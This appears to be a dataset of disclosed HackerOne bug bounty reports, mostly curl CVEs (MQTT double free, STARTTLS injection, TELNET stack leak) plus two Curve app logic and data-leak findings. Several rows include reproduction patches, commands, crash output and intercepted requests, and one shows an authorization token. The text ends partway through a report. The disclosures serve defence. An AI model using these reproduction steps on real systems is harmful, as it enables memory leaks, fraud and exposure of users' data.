curl: (58) SSL: Can't load the certificate ""testcert"" and its private key: OSStatus -50
The issue stems from the fact that Secure Transport backend code doesn't seem to prefer the keychain over the local file. The documentation says that local file should be prefixed with ""./"" when used, but the code doesn't have any such checks. Interestingly NSS SSL backend does have the check: https://github.com/curl/curl/blob/master/lib/vtls/nss.c#L432
The impact of this vulnerability is rather limited: In practice it seems to be only usable in causing denial of service against applications using  keychain client certificates.  It could happen in practice for example if executing command in /tmp directory structure or home directory of another user. The user would be able to prevent the app from creating an authenticated connection by creating a file with matching name used for  the keychain nickname used by the app.
Impact
Denial of service",https://hackerone.com/reports/1234760,England,United Kingdom,London,2021,6,15,15,39
curl,1-10,1.0,under-1m,"$1,000.00",Medium,5.45,Double Free,CVE-2021-22945: UAF and double-free in MQTT sending,"z2_  submitted a report to curl.Jul 19th (about 1 year ago)Vulnerability Description
libcurl version 7.77.0 has a Use-After-Free and a Double-Free in lib/mqtt.c in the function mqtt_doing on lines 556 - 563:
Code 202 BytesWrap lines Copy Download1if(mq->nsend) {
2  /* send the remainder of an outgoing packet */
3  char *ptr = mq->sendleftovers;
4  result = mqtt_send(data, mq->sendleftovers, mq->nsend);
5  free(ptr);
6  if(result)
7    return result;
8}
As can be seen in the code above mq->sendleftovers gets freed in line 560 but not set to NULL. If mqtt_doing gets called repeatedly and the values of mq->nsend and mq->sendleftovers don't change this can result in

Sending the metadata of the freed chunk over the network via mqtt_send
Freeing mq->sendleftovers multiple times

mq->nsend and mq->sendleftovers get set in the function mqtt_send if Curl_write cannot send all bytes in the write-buffer at once. This can e.g. happen if write() returns EAGAIN or EWOULDBLOCK. Then Curl_write sets the number of written bytes to 0 and returns CURLE_OK.
This can trigger the vulnerabilities as follows:

Supply an mqtt:// URL to curl
Have some successfull transmissions with mqtt_send
At some point have an unsuccessfull transmission such that not all bytes of the write-buffer can be sent.
This causes mq->sendleftovers and mq->nsend to be set.
Have another invocation of mqtt_doing. The code mentioned above gets executed. mq->sendleftovers gets freed.
If mqtt_send could send all remaining bytes successfully mq->sendleftovers and mq->nsend don't get reset.
Have another invocation of mqtt_doing. Since mq->nsend didn't change curl tries to send the leftover bytes again, triggering the vulnerabilities

How to reproduce the bug

Checkout tag curl-7_77_0 in the curl repository
Apply the following patch that artificially creates a scenario as described above:

Code 870 BytesWrap lines Copy Download1diff --git a/lib/sendf.c b/lib/sendf.c
2index e41bb805f..773d4b5b6 100644
3--- a/lib/sendf.c
4+++ b/lib/sendf.c
5@@ -294,6 +294,7 @@ void Curl_failf(struct Curl_easy *data, const char *fmt, ...)
6  * If the write would block (CURLE_AGAIN), we return CURLE_OK and
7  * (*written == 0). Otherwise we return regular CURLcode value.
8  */
9+static int CUSTOM_blocked = 0;
10 CURLcode Curl_write(struct Curl_easy *data,
11                     curl_socket_t sockfd,
12                     const void *mem,
13@@ -322,8 +323,13 @@ CURLcode Curl_write(struct Curl_easy *data,
14   }
15 #endif
16   bytes_written = conn->send[num](data, num, mem, len, &result);
17+  if(!CUSTOM_blocked) {
18+    bytes_written = 0;
19+    CUSTOM_blocked = 1;
20+  }
21 
22   *written = bytes_written;
23+
24   if(bytes_written >= 0)
25     /* we completely ignore the curlcode value when subzero is not returned */
26     return CURLE_OK;
27

Rebuild curl
Start a simple netcat session with: nc -lp 5678
Invoke curl with: curl mqtt://127.0.0.1:5678/

The output:
Code 104 BytesWrap lines Copy Download1free(): double free detected in tcache 2
2[1]    199104 abort (core dumped)  ./curl mqtt://127.0.0.1:5678
And in the terminal where netcat was launched it can be seen
that the content of the freed heap chunk was sent.
Impact
Since double frees of tcache chunks are not detected until glibc version 2.29
this vulnerability is perfectly exploitable for operationg systems using an older
glibc. Causing write() to return EAGAIN is more difficult but not impossible
to manage, e.g. this can always be the case if the peer is not reading as fast as
the curl client is writing (source).
At minimum this can be used to leak heap metadata which can help in exploitation.1 attachment:F1382088: patch",https://hackerone.com/reports/1269242,England,United Kingdom,London,2021,7,19,18,20
curl,1-10,1.0,under-1m,"$1,000.00",Medium,6.5,Missing Required Cryptographic Step,CVE-2021-22946: Protocol downgrade required TLS bypassed,"monnerat  submitted a report to curl.Sep 9th (about 1 year ago)Summary:
In imap and pop3, --ssl-reqd is silently ignored if the capability command failed.
In ftp, a non-standard 230 response (preauthentication?) in the greeter message forces curl to continue unencrypted, even if TLS has been required.
Steps To Reproduce:
Use a parameterizable test server to fail capability command for imap (CAPABILITY reply: A001 BAD Not implemented) and pop3 (CAPA reply: -ERR Not implemented) and to send response code 230 in FTP server greeting message.

curl --ssl-reqd imap://server/...
curl --ssl-reqd pop3://server/...
curl --ssl-reqd --ftp-ssl-control ftp://server/...

These 3 commands are successsful, but network sniffing shows that TLS is never negotiated.
Impact
A MitM can silently deny mandatory TLS negotiation and thus sniff and/or update unencrypted transferred data.3 attachments:F1441786: test985F1441787: test986F1441788: test984",https://hackerone.com/reports/1334111,England,United Kingdom,London,2021,9,9,0,34
curl,1-10,1.0,under-1m,"$1,500.00",Medium,5.3,Cryptographic Issues - Generic,CVE-2021-22947: STARTTLS protocol injection via MITM,"monnerat  submitted a report to curl.Sep 9th (about 1 year ago)Summary:
A man-in-the-middle can inject cleartext forged responses to future encrypted commands  by pipelining them to the STARTTLS response.
Steps To Reproduce:
Use the attached test case within the curl test system. It is based on IMAP FETCH with explicit TLS. Upon test failure, the downloaded file contains ""You've been hacked!"" rather than the requested mail.
Impact
Mailbox content forgery (IMAP, POP3).
Sent mail content forgery (SMTP).2 attachments:F1442574: test981F1442575: starttls-pipelining.patch",https://hackerone.com/reports/1334763,England,United Kingdom,London,2021,9,9,14,0
curl,1-10,1.0,under-1m,$200.00,Medium,6.3,Double Free,krb5: double-free in read_data() after realloc() fail,"thomas_v  submitted a report to curl.Sep 3rd (3 years ago)Summary:
In 'lib/security.c', there is a double-free of the reference 'buf->data' on the teardown path if 'Curl_saferealloc()' fails.
Also, since we read 'len' from the 'fd', the sender might be able to remotely trigger a realloc() failure, and then the double-free, by sending the value 0x7fffffff.
Introduced by
0649433da realloc: use Curl_saferealloc to avoid common mistakes
Steps To Reproduce:
Actual double-free was not reproduced.
The realloc failure with particular 'len' value can be reproduced on my 32bits linux machine with following code:
Code 284 BytesWrap lines Copy Download1#include <stdio.h>
2#include <stdlib.h>
3
4int main(void)
5{
6    void *ptr = malloc(10);
7    if (!ptr)
8        return -1;
9    int len = 0x7fffffff;
10    void *ptr2 = realloc(ptr, len);
11    if (!ptr2) {
12        printf(""Triggered realloc failure\n"");
13        return 0;
14    }
15    return -1;
16}
Comment:
Also checked other occurences of 'Curl_saferealloc()' calls which all seem fine otherwise.
Impact
Double-free after a 'realloc()' failure, which could be triggered remotely, depending on the use context of the 'read_data()' function.",https://hackerone.com/reports/686823,England,United Kingdom,London,2019,9,3,11,51
curl,1-10,1.0,under-1m,$250.00,Medium,5.2,Heap Overflow,Heap buffer overflow in TFTP when using small blksize,"thomas_v  submitted a report to curl.Aug 29th (3 years ago)Summary:
With a TFTP server that does not send OACK, but instead starts anyway with first block with 512 bytes block size, the curl library fails to assume default 512 bytes blocks. Instead it detects EOF and does not return an error code. Consequence is a truncated file that is 512 bytes without any error code.
My understanding is that from the RFC, a TFTP server might ignore blksize request and anyway send the default 512 bytes block size data.
Unless an OACK is received we should assume 512 block size, whether or not a particular blocksize was requested.
This was introduced by security fix of CVE-2019-5436:
257600341 tftp: use the current blksize for recvfrom()
Potential Fix
We could revert 2576003415625d7b5f0e390902f8097830b82275 and instead malloc the receive buffer for at least 512 bytes, or for the requested blksize if it is bigger. That would address the issue being reported and also the CVE-2019-5436.
Steps To Reproduce:

Use a TFTP server that does not send OACK in response of a particular blksize request, but instead sends directly the first block, of default size (512B).
Run curl asking for a >512 bytes block size like:
curl --tftp-blksize 8192 tftp://9.1.9.1/data.bin --output data.bin
echo $? is 0 and file size is 512 bytes

Comment
Not too sure about the Weakness identification and/or Severity, reporting it here since it was introduced by a CVE fix.
Impact
File truncation without 'curl' returning any error code.",https://hackerone.com/reports/684603,England,United Kingdom,London,2019,8,29,15,52
curl,1-10,1.0,under-1m,"$1,000.00",Medium,5.5,Information Disclosure,CVE-2021-22898: TELNET stack contents disclosure,"nyymi  submitted a report to curl.Apr 27th (2 years ago)Summary:
lib/telnet.c suboption function incorrecly checks for the sscanf return value. Instead of checking that 2 elements are parsed, the code also continues if just one element matches:
if(sscanf(v->data, ""%127[^,],%127s"", varname, varval)) {
As such it is possible to construct environment values that don't update the varval buffer and instead use the previous value. In combination of advancing in the temp buffer by strlen(v->data) + 1, this means that there will be uninitialized gaps in the generated output temp buffer. These gaps will contain whatever stack contents from previous operation of the application.
Fortunately the environment is controlled by the client and not the server. As such this vulnerability can't be exploited by the server. Practical exploitation is limited by the following requirements:

attacker is able to control the environment passed to libcurl via CURLOPT_TELNETOPTIONS (""NEW_ENV=xxx,yyy"") and control xxx and yyy in the curl_slist entries)
attacker is able to either inspect the network traffic of the telnet connection or to select the server/port the connection is established to

When both are true the attacker is able to some content of the stack. Note however that for this leak to be meaningful, some confidential or sensitive information would need to be leaked. This could happen if some key or other sensitive material (that is otherwise out of the reach of the attacker, due to for example setuid + dropping of privileges, or for example only being able to execute the command remotely in a limited fashion, for example php curl, or similar) would thus become visible fully, or partially. The leak is limited to maximum about half of the 2048 byte temp buffer.
Steps To Reproduce:

Run telnet service
tcpdump -i lo  -X -s 65535 port 23
Execute

Code 1.86 KiBWrap lines Copy Download1curl -tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa telnet://127.0.0.1 <<< foo
You'll see something like:
Code 8.49 KiBWrap lines Copy Download1        0x0000:  4500 073a 9711 4000 4006 9eaa 7f00 0001  E..:..@.@.......
2        0x0010:  7f00 0001 c79c 0017 f499 4092 2173 31a0  ..........@.!s1.
3        0x0020:  8018 0200 052f 0000 0101 080a d7e7 b666  ...../.........f
4        0x0030:  d7e7 b666 fffa 2700 0061 6161 6161 6161  ...f..'..aaaaaaa
5        0x0040:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
6        0x0050:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
7        0x0060:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
8        0x0070:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
9        0x0080:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
10        0x0090:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
11        0x00a0:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
12        0x00b0:  6161 6161 6161 6161 0100 0000 0000 0000  aaaaaaaa........
13        0x00c0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
14        0x00d0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
15        0x00e0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
16        0x00f0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
17        0x0100:  0000 0000 0000 0000 0000 0000 0000 0000  ................
18        0x0110:  0000 0000 0000 0000 0000 0000 0000 0000  ................
19        0x0120:  0000 0000 0000 0000 0000 0000 0000 0000  ................
20        0x0130:  0000 0000 0000 0000 0061 6161 6161 6161  .........aaaaaaa
21        0x0140:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
22        0x0150:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
23        0x0160:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
24        0x0170:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
25        0x0180:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
26        0x0190:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
27        0x01a0:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
28        0x01b0:  6161 6161 6161 6161 0100 0000 6025 fec0  aaaaaaaa....`%..
29        0x01c0:  7c7f 0000 0000 0000 0000 0000 e002 0000  |...............
30        0x01d0:  0000 0000 60cd f654 7c55 0000 0088 2975  ....`..T|U....)u
31        0x01e0:  780b b94a 0000 0000 0000 0000 c45d b9aa  x..J.........]..
32        0x01f0:  fd7f 0000 a05b b9aa fd7f 0000 a05c b9aa  .....[.......\..
33        0x0200:  fd7f 0000 2042 f754 7c55 0000 702a f754  .....B.T|U..p*.T
34        0x0210:  7c55 0000 0000 0000 0000 0000 148f e7c0  |U..............
35        0x0220:  7c7f 0000 3000 0000 3000 0000 505b b9aa  |...0...0...P[..
36        0x0230:  fd7f 0000 905a b9aa 0061 6161 6161 6161  .....Z...aaaaaaa
37        0x0240:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
38        0x0250:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
39        0x0260:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
40        0x0270:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
41        0x0280:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
42        0x0290:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
43        0x02a0:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
44        0x02b0:  6161 6161 6161 6161 0100 0000 605d b9aa  aaaaaaaa....`]..
45        0x02c0:  fd7f 0000 605d b9aa fd7f 0000 695d b9aa  ....`]......i]..
46        0x02d0:  fd7f 0000 ffff ffff ffff ffff 605d b9aa  ............`]..
47        0x02e0:  fd7f 0000 ffff ffff ffff ffff 0000 0000  ................
48        0x02f0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
49        0x0300:  0000 0000 0000 0000 0000 0000 0000 0000  ................
50        0x0310:  0000 0000 1000 0000 0000 0000 7413 f1c0  ............t...
51        0x0320:  7c7f 0000 0000 b9aa fd7f 0000 0000 0000  |...............
52        0x0330:  0000 0000 1000 0000 0061 6161 6161 6161  .........aaaaaaa
53        0x0340:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
54        0x0350:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
55        0x0360:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
56        0x0370:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
57        0x0380:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
58        0x0390:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
59        0x03a0:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
60        0x03b0:  6161 6161 6161 6161 0100 0000 e82e f754  aaaaaaaa.......T
61        0x03c0:  7c55 0000 0000 0000 0000 0000 702a f754  |U..........p*.T
62        0x03d0:  7c55 0000 2042 f754 7c55 0000 148f e7c0  |U...B.T|U......
63        0x03e0:  7c7f 0000 3000 0000 3000 0000 105d b9aa  |...0...0....]..
64        0x03f0:  fd7f 0000 505c b9aa fd7f 0000 0088 2975  ....P\........)u
65        0x0400:  780b b94a c05d b9aa fd7f 0000 2042 f754  x..J.].......B.T
66        0x0410:  7c55 0000 7f00 0000 0000 0000 0000 0000  |U..............
67        0x0420:  0000 0000 0000 0000 0000 0000 0100 0000  ................
68        0x0430:  0000 0000 a47b e2c0 0061 6161 6161 6161  .....{...aaaaaaa
69        0x0440:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
70        0x0450:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
71        0x0460:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
72        0x0470:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
73        0x0480:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
74        0x0490:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
75        0x04a0:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
76        0x04b0:  6161 6161 6161 6161 0100 0000 aea3 e7c0  aaaaaaaa........
77        0x04c0:  7c7f 0000 1700 0000 0000 0000 1000 0000  |...............
78        0x04d0:  3000 0000 005f b9aa fd7f 0000 305e b9aa  0...._......0^..
79        0x04e0:  fd7f 0000 0180 adfb fd7f 0000 47f3 f654  ............G..T
80        0x04f0:  7c55 0000 49f3 f654 7c55 0000 40f2 f654  |U..I..T|U..@..T
81        0x0500:  7c55 0000 40f2 f654 7c55 0000 40f2 f654  |U..@..T|U..@..T
82        0x0510:  7c55 0000 40f2 f654 7c55 0000 40f2 f654  |U..@..T|U..@..T
83        0x0520:  7c55 0000 49f3 f654 7c55 0000 0000 0000  |U..I..T|U......
84        0x0530:  0000 0000 0000 0000 0061 6161 6161 6161  .........aaaaaaa
85        0x0540:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
86        0x0550:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
87        0x0560:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
88        0x0570:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
89        0x0580:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
90        0x0590:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
91        0x05a0:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
92        0x05b0:  6161 6161 6161 6161 0100 0000 1f00 0000  aaaaaaaa........
93        0x05c0:  0000 0000 3001 0000 0000 0000 0000 0000  ....0...........
94        0x05d0:  0000 0000 0200 0000 3000 0000 6e00 0000  ........0...n...
95        0x05e0:  7c00 0000 0000 0000 0000 0000 5b00 0000  |...........[...
96        0x05f0:  7700 0000 0000 0000 0000 0000 0000 0000  w...............
97        0x0600:  0000 0000 8038 f754 7c55 0000 0000 0000  .....8.T|U......
98        0x0610:  0000 0000 1000 0000 0000 0000 b0ff ffff  ................
99        0x0620:  ffff ffff 805f b9aa fd7f 0000 2042 f754  ....._.......B.T
100        0x0630:  7c55 0000 1a21 f954 0061 6161 6161 6161  |U...!.T.aaaaaaa
101        0x0640:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
102        0x0650:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
103        0x0660:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
104        0x0670:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
105        0x0680:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
106        0x0690:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
107        0x06a0:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
108        0x06b0:  6161 6161 6161 6161 0100 5600 0000 0000  aaaaaaaa..V.....
109        0x06c0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
110        0x06d0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
111        0x06e0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
112        0x06f0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
113        0x0700:  0000 0000 f7f9 bbaa fd7f 0000 0100 0000  ................
114        0x0710:  0000 0000 b05f b9aa fd7f 0000 0e5f 07c1  ....._......._..
115        0x0720:  7c7f 0000 0100 0000 0000 0000 417b eec0  |...........A{..
116        0x0730:  7c7f 0000 6161 6161 fff0                 |...aaaa..
Fix
Code 642 BytesWrap lines Copy Download1diff --git a/lib/telnet.c b/lib/telnet.c
2index f96a4cb4c..845b59db5 100644
3--- a/lib/telnet.c
4+++ b/lib/telnet.c
5@@ -921,7 +923,7 @@ static void suboption(struct Curl_easy *data)
6         size_t tmplen = (strlen(v->data) + 1);
7         /* Add the variable only if it fits */
8         if(len + tmplen < (int)sizeof(temp)-6) {
9-          if(sscanf(v->data, ""%127[^,],%127s"", varname, varval)) {
10+          if(sscanf(v->data, ""%127[^,],%127s"", varname, varval) == 2) {
11             msnprintf((char *)&temp[len], sizeof(temp) - len,
12                       ""%c%s%c%s"", CURL_NEW_ENV_VAR, varname,
13                       CURL_NEW_ENV_VALUE, varval);
Impact
Leak of potentially confidential information.",https://hackerone.com/reports/1176461,England,United Kingdom,London,2021,4,27,9,49
Curve,251-500,0.0,10m-50m,"$1,000.00",Medium,4.3,Business Logic Errors,Business Logic Flaw - A non premium user can change/update retailers to get cashback on all the retailers associated with Curve,"praseudo7  submitted a report to Curve.Aug 13th (3 years ago)Hi,
While testing your android application I've found a business logic flaw by using which a non premium user can update/change the retailers when ever and what ever retailers he wants to.
Curve application has a functionality called ""Earn curve cash"". A non premium user can select only 3 retailers (where as premium user can select 6 or more retailers) at a time. A business logic flaw exists at this endpoint by using which a non premium user can update/change already existing retailers and can use cashback with all the retailers associated with curve application.
Steps to reproduce:
1] Login to non premium user account
2] Navigate to ""Earn curve cash"" and you can select only 3 retailers (because you are non premium user)
3] And click on ""Confirm""
4] You have now added 3 retailers to your account and you dont have any option to edit/update the added retailers.
5] Now go back to ""Earn curve cash"" functionality and make sure to capture the request and response
Request:
Code 574 BytesWrap lines Copy Download1GET /v1/rewards/users/programs/e329e463-7f5d-4358-9109-4f97c9f86abd/merchants HTTP/1.1
2Accept: application/json
3Curve-UserAgent: Android;Genymotion;Custom Phone
4Curve-AppAndVersion: Curve Android 2.9.0
5crv-user-agent: Android 2.9.0/20900
6Authorization: APE7kg446BXw2iFEI6Ca079RaGrJ3bcelA9DKDoUFUA
7crv-idempotency-key: a161ccfc-077c-4099-a180-ebbbacb50da6
8crv-request-id: 88fb2296-46f4-49e4-858f-8aff312a9587
9crv-correlation-id: android-98600fe2-6b09-48d8-94b1-cecf73094c43
10Host: api.imaginecurve.com
11Connection: close
12Accept-Encoding: gzip, deflate
13User-Agent: okhttp/3.12.2
Response:
Code 1.02 KiBWrap lines Copy Download1HTTP/1.1 200 OK
2Date: Tue, 13 Aug 2019 14:55:30 GMT
3Content-Type: application/json
4Connection: close
5server: envoy
6cache-control: no-cache, private
7set-cookie: device_view=full; expires=Fri, 13-Sep-2019 14:55:30 GMT; Max-Age=2678400; path=/; HttpOnly
8x-envoy-upstream-service-time: 48
9Content-Length: 734
10
11{""success"":true,""data"":{""merchants"":[{""id"":""7603f8b7-407c-4234-9153-7fe3b29863ed"",""name"":""Waitrose"",""alias"":""waitrose"",""hidden"":false,""countries"":[""GBR""],""category"":{""id"":""0856b35f-ea59-479a-8f25-b70772d39dc8"",""name"":""Groceries"",""curve_category_id"":10},""percentage"":1},{""id"":""ca6daefd-f772-4286-9d70-504b094a98b8"",""name"":""Whole Foods"",""alias"":""wholefoods"",""hidden"":false,""countries"":[""GBR""],""category"":{""id"":""0856b35f-ea59-479a-8f25-b70772d39dc8"",""name"":""Groceries"",""curve_category_id"":10},""percentage"":1},{""id"":""efb47f27-d905-4047-889c-f4da68e5a9b3"",""name"":""Tesco"",""alias"":""tesco"",""hidden"":false,""countries"":[""GBR""],""category"":{""id"":""0856b35f-ea59-479a-8f25-b70772d39dc8"",""name"":""Groceries"",""curve_category_id"":10},""percentage"":1}]}}
6] Now change the response body with below JSON content and turn off the burp interception
Code 40 BytesWrap lines Copy Download1{""success"":true,""data"":{""merchants"":[]}}
7] Now you can again select any three new retailers and click on ""Confirm""
8] You have now successfully updated/changed the retailers and can use the cashback on all the retailers associated with curve application.
For better understanding I've attached video POC below.
Video F554505: curve_business_logic.mp4 30.30 MiBZoom in Zoom out Copy Download
Impact
A non premium user can miss-use the business logic and can use cashback's with all the merchants associated with the curve application.
Mitigation:
Make sure to validate the responses and user based authorization for each endpoint on the server-side.
Regards,
Praseudo1 attachment:F554505: curve_business_logic.mp4",https://hackerone.com/reports/672487,New York,United States,New York,2019,8,13,15,7
Curve,251-500,0.0,10m-50m,"$1,500.00",Medium,5.45,Cleartext Transmission of Sensitive Information,Sensitive Info Leak - An Attacker Can Retrieve All the Users Mobile Numbers at https://website-api.production.curve.app/api/waitlist/us,"praseudo7  submitted a report to Curve.Jun 19th (2 years ago)Hi,
When am going through all the JS files in curve.com I found a link called ""/usa"" is used to create Curve USA Waitlists by entering your name, email address, mobile number and address details. 
Image F874173: Image_2020-06-19_at_2.57.13_PM.png 380.36 KiBZoom in Zoom out Copy Download
Then there is a functionality called ""Track my Position"" by using which joined users can view their position in the waiting lists. 
Image F874174: Image_2020-06-19_at_2.59.13_PM.png 1.27 MiBZoom in Zoom out Copy Download
Well, in UI the application only shows the position number but not any other sensitive details. 
Image F874175: Image_2020-06-19_at_3.23.36_PM.png 797.77 KiBZoom in Zoom out Copy Download
But by using the below reported endpoint an attacker can retrieve all the joined users mobile numbers and the other details by just entering the victims email address.
Steps to Reproduce:
1] Navigate to https://curve.com/usa and click on ""Track my position""
2] Enter any email address and click on ""Submit""
3] Make sure to intercept the request using Burp intercept
4] You'll be presented with the below vulnerable request
Vulnerable Request:
Code 575 BytesWrap lines Copy Download1POST /api/waitlist/us HTTP/1.1
2Host: website-api.production.curve.app
3Connection: close
4Content-Length: 30
5Accept: application/json, text/plain, */*
6User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36
7Content-Type: application/json;charset=UTF-8
8Origin: https://www.curve.com
9Sec-Fetch-Site: cross-site
10Sec-Fetch-Mode: cors
11Sec-Fetch-Dest: empty
12Referer: https://www.curve.com/credit?rc=
13Accept-Encoding: gzip, deflate
14Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
15
16{""email"":""praseudo@gmail.com""}
